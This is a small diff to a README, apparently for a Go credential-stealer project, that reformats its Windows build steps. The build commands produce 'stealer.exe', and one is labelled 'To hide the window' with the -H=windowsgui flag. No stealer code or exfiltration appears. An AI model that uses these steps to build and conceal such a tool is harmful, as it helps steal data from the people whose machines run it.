@@ -35,7 +35,9 @@ go get golang.org/x/crypto/pbkdf2
 ### Windows
 ```
 GOOS=windows ARCH=amd64 go build -ldflags "-s -w" -o stealer.exe .
-#to hide the window
+```
+**To hide the window**
+```
 GOOS=windows ARCH=amd64 go build -ldflags "-s -w -H=windowsgui" -o stealer.exe .
 ```
 ### Linux
